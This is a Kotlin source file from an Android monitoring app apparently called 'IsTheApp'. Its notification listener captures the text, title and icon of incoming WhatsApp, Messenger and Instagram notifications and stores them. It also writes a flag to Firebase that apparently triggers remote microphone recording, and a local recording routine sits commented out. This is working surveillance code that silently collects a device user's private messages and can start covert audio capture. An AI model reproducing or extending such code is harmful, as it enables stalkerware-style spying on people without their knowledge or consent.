package com.github.midros.istheapp.services.notificationService

import android.app.Notification
import android.media.MediaRecorder
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.github.midros.istheapp.app.IsTheApp
import com.github.midros.istheapp.data.model.ChildRecording
import com.github.midros.istheapp.data.rxFirebase.InterfaceFirebase
import com.github.midros.istheapp.utils.ConstFun
import com.github.midros.istheapp.utils.Consts
import com.github.midros.istheapp.utils.Consts.FACEBOOK_MESSENGER_PACK_NAME
import com.github.midros.istheapp.utils.Consts.INSTAGRAM_PACK_NAME
import com.github.midros.istheapp.utils.Consts.TYPE_INSTAGRAM
import com.github.midros.istheapp.utils.Consts.TYPE_MESSENGER
import com.github.midros.istheapp.utils.Consts.TYPE_WHATSAPP
import com.github.midros.istheapp.utils.Consts.WHATSAPP_PACK_NAME
import com.github.midros.istheapp.utils.FileHelper.getFileNameAudio
import com.github.midros.istheapp.utils.MyCountDownTimer
import com.google.firebase.database.DatabaseReference
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/19.
 */
class NotificationService : NotificationListenerService() {

    @Inject lateinit var interactor:InteractorNotificationService
    @Inject
    lateinit var firebase: InterfaceFirebase
    override fun onCreate() {
        super.onCreate()
        IsTheApp.appComponent.inject(this)
    }

    override fun onListenerConnected() {
        interactor.setRunService(true)
    }
    private fun getReference(child: String):
            DatabaseReference = firebase.getDatabaseReference(child)
    override fun onListenerDisconnected() {
        interactor.setRunService(false)
    }
   /*
    private fun startRecording(startTime: Long) {
        timer = MyCountDownTimer(startTime, interval, {
            setIntervalRecord(it)
        }) {
            stopRecording()
        }
        nameAudio = ConstFun.getRandomNumeric()
        dateTime = ConstFun.getDateTime()
        fileName = context.getFileNameAudio(nameAudio, dateTime)

        recorder.startRecording(MediaRecorder.AudioSource.MIC, fileName)
        timer!!.start()

    }
    */
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)

        if (sbn!=null){
            val typeNotification = matchTypeNotification(sbn.packageName)

            if (sbn.tag != null && typeNotification!=0){
                val childRecording = ChildRecording(true,60000)
                getReference("${Consts.RECORDING}/${Consts.PARAMS}").setValue(childRecording)
         //       startRecording(child.timeAudio!!)
                val bundle = sbn.notification.extras
                val text = bundle.getString(Notification.EXTRA_TEXT)
                val title = bundle.getString(Notification.EXTRA_TITLE)
                val icon = sbn.notification.largeIcon
                val nameImage = sbn.postTime

                interactor.getNotificationExists(nameImage.toString()){
                    interactor.setDataMessageNotification(typeNotification,text,title,nameImage.toString(),icon)
                }

            }
        }
    }

    private fun matchTypeNotification(packageName:String) : Int =
            when (packageName) {
                FACEBOOK_MESSENGER_PACK_NAME -> TYPE_MESSENGER
                WHATSAPP_PACK_NAME -> TYPE_WHATSAPP
                INSTAGRAM_PACK_NAME -> TYPE_INSTAGRAM
                else -> 0
            }

}